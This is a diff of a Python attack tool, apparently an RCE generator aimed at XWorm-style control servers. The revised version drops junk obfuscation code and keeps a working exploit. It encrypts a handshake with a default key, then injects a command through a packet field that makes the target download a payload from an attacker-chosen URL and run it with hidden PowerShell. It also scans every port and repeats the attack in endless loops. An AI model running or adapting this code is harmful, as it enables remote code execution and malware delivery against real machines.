@@ -1,285 +1,182 @@
-import socket,io,random,string,hashlib,os,sys,time,json,base64,zlib,csv,re,math,datetime,threading,subprocess,platform,binascii,struct,crypt,hmac,itertools,collections,functools,operator,pathlib,textwrap,decimal,fractions,statistics,pprint,fileinput,tempfile,shutil,glob,fnmatch,linecache,mimetypes,getpass,locale,atexit,signal,traceback
+import socket
+import io
+import random
+import string
+import hashlib
+import os
+import sys
+import time
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
-from colorama import Fore,init
+from colorama import Fore, init
+
 init(autoreset=True)
 
-_xXx_ = 1337
-__neo__ = "matrix"
-___void___ = None
-_cyberpunk = [1,0,0,1]
-_nvidia = "rtx4090"
-_bitcoin = 69420
-_elite = "hacker"
-_1337 = True
-_wireless = "wifi6e"
-_tesla = "cybertruck"
-_nullptr = 0xdeadbeef
-_stack = []
-_queue = {}
-_heap = set()
-_buffer = bytearray()
-_packet = b""
-_shellcode = b"\x90" * 100
-_nop_sled = lambda x: x + 0x90
-_rop_chain = [0x41414141, 0x42424242]
+def clear_screen():
+    os.system('cls' if sys.platform == 'win32' else 'clear')
 
-def __x__():
-    _a = [i**2 for i in range(100)]
-    _b = {k: v for k, v in enumerate("abcdefghijklmnopqrstuvwxyz")}
-    _c = sum(_a) / len(_a)
-    _d = "".join(reversed(str(_c)))
-    _e = base64.b64encode(_d.encode())
-    _f = zlib.compress(_e)
-    _g = hashlib.sha256(_f).hexdigest()
-    _h = [_g[i:i+2] for i in range(0, len(_g), 2)]
-    _i = [chr(int(x, 16) % 26 + 97) for x in _h]
-    _j = "".join(_i)
-    os.system('cls' if sys.platform=='win32' else 'clear')
-    for ___ in range(50):
-        pass
-    _k = datetime.datetime.now().isoformat()
-    _l = threading.active_count()
-    _m = platform.uname()
-    _n = os.cpu_count()
-    _o = sys.getsizeof(_k)
-    return None
+def genid(length):
+    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))
 
-def _f_uck(l):
-    _p = ''.join(random.choice(string.ascii_letters + string.digits + '+/') for _ in range(64))
-    _q = base64.b64decode(_p + '==')
-    _r = hashlib.sha512(_q).digest()
-    _s = binascii.hexlify(_r).decode()
-    _t = [_s[i:i+4] for i in range(0, len(_s), 4)]
-    _u = "-".join(_t)
-    _v = crypt.crypt(_u, "$6$rounds=5000$" + random.choice(string.ascii_letters))
-    return ''.join(random.choice(string.ascii_uppercase+string.digits) for _ in range(l))
+class Packet:
+    def __init__(self, data: list[bytes]):
+        self.data = data
 
-def _X_neo_(d):
-    _w = {"pid": os.getpid(), "ppid": os.getppid(), "time": time.time(), "random": random.random(), "data": d[:min(4, len(d))]}
-    _x = json.dumps(_w, indent=2)
-    _y = csv.StringIO()
-    _z = csv.writer(_y)
-    _za = [["col1", "col2"], ["val1", "val2"], ["val3", "val4"]]
-    _zb = csv.writer(_y).writerows(_za)
-    _zc = _y.getvalue()
-    _zd = re.sub(r'[a-z]', '#', _zc)
-    _ze = io.BytesIO()
-    _ze.write(b'<Kkmm>'.join(d))
-    return _ze.getbuffer().tobytes()
+    def get_bytes(self):
+        b = io.BytesIO()
+        b.write(b'<Xwormmm>'.join(self.data))
+        return b.getbuffer().tobytes()
 
-def __s_send__(s, p, k):
-    _zf = socket.socketpair()
-    _zf[0].close()
-    _zf[1].close()
-    _zg = [x for x in range(1000) if x % 2 == 0 and x % 3 == 0 and x % 5 == 0]
-    _zh = list(itertools.permutations([1,2,3], 2))
-    _zi = collections.Counter(random.choices(string.ascii_lowercase, k=1000))
-    _zj = functools.reduce(lambda a,b: a+b, [1,2,3,4,5])
-    _zk = operator.mul(999, 999)
+def sendpacket(sock, packet, key):
     try:
-        _zl = hashlib.md5(k.encode('utf-8')).digest()
-        _zm = AES.new(_zl, AES.MODE_ECB)
-        _zn = _zm.encrypt(pad(p(), 16))
-        s.send(str(len(_zn)).encode('utf-8') + b'\x00')
-        s.send(_zn)
-        _zo = struct.pack('<I', 0x41414141)
-        _zp = struct.unpack('<I', _zo)[0]
-        _zq = hmac.new(b"key", b"msg", hashlib.sha256).hexdigest()
-        return 1
+        key_hash = hashlib.md5(key.encode('utf-8')).digest()
+        crypto = AES.new(key_hash, AES.MODE_ECB)
+        encrypted = crypto.encrypt(pad(packet.get_bytes(), 16))
+        sock.send(str(len(encrypted)).encode('utf-8') + b'\x00')
+        sock.send(encrypted)
+        return True
     except:
-        return 0
+        return False
 
-def _r_UN_(h, po, k, fu):
-    s = None
-    _zr = tempfile.mkdtemp(prefix="sys_")
-    _zs = os.path.join(_zr, "cache", "tmp")
+def execute_payload(host, port, key, file_url):
+    sock = None
     try:
-        os.makedirs(_zs, exist_ok=True)
-    except:
-        pass
-    _zt = pathlib.Path(_zr) / "logs" / "access.log"
-    _zu = textwrap.dedent("""\
-        this is a decoy log file
-        that means absolutely nothing
-        it just wastes your time
-    """)
-    try:
-        os.makedirs(str(_zt.parent), exist_ok=True)
-        with open(str(_zt), 'w') as _zv:
-            _zv.write(_zu)
-    except:
-        pass
-    _zw = decimal.Decimal('3.1415926535897932384626433832795028841971')
-    _zx = fractions.Fraction(22, 7)
-    _zy = statistics.mean([random.randint(1,100) for _ in range(50)])
-    _zz = pprint.pformat({"nested": {"deep": {"value": "hidden"}}}, indent=4)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)
+        sock.connect((host, port))
+        
     
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(10)
-        s.connect((h, po))
-        print(Fore.GREEN + f"[+] ok {h}" + Fore.RESET)
-        
-        _aaa = _f_uck(16)
-        _aab = _X_neo_([b'hand', _aaa.encode()])
-        if not __s_send__(s, _aab, k):
-            print(Fore.RED + "[+] no" + Fore.RESET)
-            s.close()
-            shutil.rmtree(_zr, ignore_errors=True)
-            return 0
-        
-        fe = '.bat' if fu.lower().endswith('.bat') else '.exe'
-        _aac = _f_uck(5) + fe
-        
-        if fe == '.bat':
-            _aad = f'start powershell.exe -WindowStyle Hidden $url="{fu}"; $o="$env:TEMP\\{_aac}"; iwr -Uri $url -OutFile $o; Start-Process -FilePath cmd.exe -ArgumentList /c,$o'
+        print(Fore.GREEN + f"Successfully Connected To {host}" + Fore.RESET)
+
+        client_id = genid(16)
+        handshake_packet = Packet([b'hrdp', client_id.encode('utf-8')])
+        if not sendpacket(sock, handshake_packet, key):
+            print(Fore.RED + "Decline" + Fore.RESET)
+            sock.close()
+            return False
+
+        file_extension = '.bat' if file_url.lower().endswith('.bat') else '.exe'
+        random_filename = genid(5) + file_extension
+
+        if file_extension == '.bat':
+            ps_command = f'start powershell.exe -WindowStyle Hidden $url = "{file_url}"; $outputPath = "$env:TEMP\\{random_filename}"; Invoke-WebRequest -Uri $url -OutFile $outputPath; Start-Process -FilePath \'cmd.exe\' -ArgumentList \'/c\', $outputPath'
         else:
-            _aad = f'start powershell.exe -WindowStyle Hidden $url="{fu}"; $o="$env:TEMP\\{_aac}"; iwr -Uri $url -OutFile $o; Start-Sleep -s 3; cmd.exe /c start "" $o'
+            ps_command = f'''start powershell.exe -WindowStyle Hidden $url = "{file_url}"; $outputPath = "$env:TEMP\\{random_filename}"; Invoke-WebRequest -Uri $url -OutFile $outputPath; Start-Sleep -s 3; cmd.exe /c start "" $outputPath'''
+
+        exploit_packet = Packet([
+            b'hrdp+',
+            client_id.encode('utf-8'),
+            b' lol',
+            f'" & {ps_command}'.encode('utf-8'),
+            b'1:1'
+        ])
         
-        _aae = _X_neo_([b'hand+', _aaa.encode(), b' xx', f'" & {_aad}'.encode(), b'1:1'])
-        if not __s_send__(s, _aae, k):
-            print(Fore.RED + "[+] no" + Fore.RESET)
-            s.close()
-            shutil.rmtree(_zr, ignore_errors=True)
-            return 0
+        if not sendpacket(sock, exploit_packet, key):
+            print(Fore.RED + "Decline" + Fore.RESET)
+            sock.close()
+            return False
+
+        sock.close()
+        return True
         
-        s.close()
-        _aaf = fileinput.input(files=[str(_zt)])
-        for _aag in _aaf:
-            pass
-        _aaf.close()
-        shutil.rmtree(_zr, ignore_errors=True)
-        return 1
-    except:
-        print(Fore.RED + "[+] no" + Fore.RESET)
+    except socket.timeout:
+        print(Fore.RED + "Decline" + Fore.RESET)
+    except ConnectionRefusedError:
+        print(Fore.RED + "Decline" + Fore.RESET)
+    except Exception:
+        print(Fore.RED + "Decline" + Fore.RESET)
     finally:
-        if s:
+        if sock:
             try:
-                s.close()
+                sock.close()
             except:
                 pass
-        try:
-            shutil.rmtree(_zr, ignore_errors=True)
-        except:
-            pass
-    return 0
+    return False
 
-def _B_A_N_N_E_R_():
-    _aah = getpass.getuser()
-    _aai = os.getlogin()
-    _aaj = locale.getdefaultlocale()
-    _aak = platform.architecture()
-    _aal = platform.machine()
-    _aam = platform.processor()
-    _aan = platform.node()
-    _aao = platform.platform()
-    _aap = os.environ.get('PATH', '').split(os.pathsep)[:3]
-    _aaq = [x for x in dir(socket) if not x.startswith('_')]
-    _aar = random.choices(_aaq, k=10)
-    _aas = atexit.register(lambda: None)
-    _aat = signal.signal(signal.SIGINT, signal.SIG_DFL)
-    
-    print(Fore.MAGENTA + """
-   ██████╗  ██████╗ ███████╗
-   ██╔══██╗██╔════╝ ██╔════╝
-   ██████╔╝██║      █████╗  
-   ██╔══██╗██║      ██╔══╝  
-   ██║  ██║╚██████╗ ███████╗
-   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
-           Made By EpicDxoma ~ Fuck Skids
+def show_banner():
+    print(Fore.RED + r"""
+                                                                            
+██████╗░░█████╗░███████╗  ░██████╗░███████╗███╗░░██╗███████╗██████╗░░█████╗░████████╗░█████╗░██████╗░
+██╔══██╗██╔══██╗██╔════╝  ██╔════╝░██╔════╝████╗░██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
+██████╔╝██║░░╚═╝█████╗░░  ██║░░██╗░█████╗░░██╔██╗██║█████╗░░██████╔╝███████║░░░██║░░░██║░░██║██████╔╝
+██╔══██╗██║░░██╗██╔══╝░░  ██║░░╚██╗██╔══╝░░██║╚████║██╔══╝░░██╔══██╗██╔══██║░░░██║░░░██║░░██║██╔══██╗
+██║░░██║╚█████╔╝███████╗  ╚██████╔╝███████╗██║░╚███║███████╗██║░░██║██║░░██║░░░██║░░░╚█████╔╝██║░░██║
+╚═╝░░╚═╝░╚════╝░╚══════╝  ░╚═════╝░╚══════╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
+                                                                                                                                                                                
+                        Coded By laa3een
+                        
+                        discord.gg/4XhVJznm8
+                
 """ + Fore.RESET)
 
-def _M_A_I_N_():
-    __x__()
-    _B_A_N_N_E_R_()
+def main():
+    clear_screen()
+    show_banner()
     
-    _aau = []
-    for _aav in range(3):
-        _aaw = threading.Thread(target=lambda: [x*x for x in range(10000)], daemon=True)
-        _aaw.start()
-        _aau.append(_aaw)
+    print(Fore.RED + "# Configure database connection" + Fore.RESET)
+    print(Fore.RED + "* Please enter connection details:" + Fore.RESET)
     
-    _aax = tempfile.gettempdir()
-    _aay = os.path.join(_aax, ".sys_update_" + ''.join(random.choice(string.hexdigits) for _ in range(8)))
-    try:
-        with open(_aay, 'wb') as _aaz:
-            _aaz.write(os.urandom(4096))
-    except:
-        pass
+    host = input(Fore.RED + "[*] Enter IP-Address/Hostname. Example: (127.0.0.1): " + Fore.RESET)
     
-    try:
-        _aba = linecache.getline('/etc/hostname', 1)
-    except:
-        _aba = "localhost"
+    print(Fore.RED + "[1] Manual Port" + Fore.RESET)
+    print(Fore.RED + "[2] Full Scan (1-65535)" + Fore.RESET)
+    scan_mode = input(Fore.RED + "[*] Choose scan mode (1 or 2): " + Fore.RESET)
     
-    print(Fore.MAGENTA + "[+] enter victim info " + Fore.RESET)
-    h = input(Fore.MAGENTA + "[+] host: " + Fore.RESET)
-    print(Fore.MAGENTA + "[+] 1 port" + Fore.RESET)
-    print(Fore.MAGENTA + "[+] 2 scan" + Fore.RESET)
-    
-    _abb = input(Fore.MAGENTA + "[+] 1/2: " + Fore.RESET)
-    po = None
-    
-    if _abb == '1':
-        po = int(input(Fore.MAGENTA + "[+] port: " + Fore.RESET))
-    elif _abb == '2':
-        po = None
+    port = None
+    if scan_mode == '1':
+        port = int(input(Fore.RED + "[*] Enter Port Number: " + Fore.RESET))
+    elif scan_mode == '2':
+        port = None
     else:
-        print(Fore.MAGENTA + "[+] wrong" + Fore.RESET)
+        print(Fore.RED + "[!] Invalid choice. Exiting..." + Fore.RESET)
         return
     
-    _abc = input(Fore.MAGENTA + "[+] key: " + Fore.RESET)
-    if not _abc:
-        _abc = "<123456789>"
+    key = input(Fore.RED + "[*] Encryption key default: `<123456789>': `<123456789>`" + Fore.RESET)
+    if not key:
+        key = "<123456789>"
     
-    _abd = input(Fore.MAGENTA + "[+] url: " + Fore.RESET)
+    file_url = input(Fore.RED + "[*] Payload URL to download. Example: (https://example.com/file.exe): " + Fore.RESET)
     
-    print(Fore.MAGENTA + f"\n[+] target {h}" + Fore.RESET)
+    print(Fore.RED + f"\n[*] Target: {host}" + Fore.RESET)
     
-    if _abb == '1':
-        print(Fore.MAGENTA + f"[+] port {po}" + Fore.RESET)
-        print(Fore.MAGENTA + f"[+] key {_abc}" + Fore.RESET)
-        print(Fore.MAGENTA + f"[+] url {_abd}" + Fore.RESET)
-        print(Fore.MAGENTA + "[+] go\n" + Fore.RESET)
-        while 1:
-            _r_UN_(h, po, _abc, _abd)
+    if scan_mode == '1':
+        print(Fore.RED + f"[*] Target Port: {port}" + Fore.RESET)
+        print(Fore.RED + f"[*] Encryption Key: {key}" + Fore.RESET)
+        print(Fore.RED + f"[*] Payload URL: {file_url}" + Fore.RESET)
+        print(Fore.RED + "[*] Starting attack...\n" + Fore.RESET)
+        
+        while True:
+            execute_payload(host, port, key, file_url)
             time.sleep(5)
     
-    elif _abb == '2':
-        print(Fore.MAGENTA + "[+] scan 1-65535" + Fore.RESET)
-        print(Fore.MAGENTA + f"[+] key {_abc}" + Fore.RESET)
-        print(Fore.MAGENTA + f"[+] url {_abd}" + Fore.RESET)
-        print(Fore.MAGENTA + "[+] start\n" + Fore.RESET)
-        while 1:
-            for _abe in range(1, 65536):
+    elif scan_mode == '2':
+        print(Fore.RED + "[*] Scan Mode: Full Port Scan (1-65535)" + Fore.RESET)
+        print(Fore.RED + f"[*] Encryption Key: {key}" + Fore.RESET)
+        print(Fore.RED + f"[*] Payload URL: {file_url}" + Fore.RESET)
+        print(Fore.RED + "[*] Starting full scan...\n" + Fore.RESET)
+        
+        while True:
+            for p in range(1, 65536):
                 try:
-                    _abf = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    _abf.settimeout(0.3)
-                    if _abf.connect_ex((h, _abe)) == 0:
-                        print(Fore.GREEN + f"[+] {h}:{_abe} open" + Fore.RESET)
-                        _r_UN_(h, _abe, _abc, _abd)
-                    _abf.close()
+                    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    test_sock.settimeout(0.3)
+                    if test_sock.connect_ex((host, p)) == 0:
+                        print(Fore.GREEN + f"[+] {host}:{p} is open" + Fore.RESET)
+                        execute_payload(host, p, key, file_url)
+                    test_sock.close()
                 except:
                     pass
-                if _abe % 1000 == 0:
-                    print(Fore.YELLOW + f"[+] {_abe}/65535" + Fore.RESET)
-            print(Fore.YELLOW + "[+] again\n" + Fore.RESET)
+                
+                if p % 1000 == 0:
+                    print(Fore.YELLOW + f"[*] Progress: {p}/65535 ports scanned..." + Fore.RESET)
+            
+            print(Fore.YELLOW + "[*] Scan completed. Restarting...\n" + Fore.RESET)
             time.sleep(30)
-    
-    try:
-        os.unlink(_aay)
-    except:
-        pass
-    try:
-        os.unlink(_aay + ".log")
-    except:
-        pass
 
 if __name__ == "__main__":
     try:
-        _M_A_I_N_()
+        main()
     except KeyboardInterrupt:
-        print(Fore.RED + "\n[+] exit" + Fore.RESET)
+        print(Fore.RED + "\n[!] Operation cancelled by user" + Fore.RESET)
     except Exception as e:
-        print(Fore.RED + f"[+] err {e}" + Fore.RESET)
+        print(Fore.RED + f"[!] Critical error: {str(e)}" + Fore.RESET)
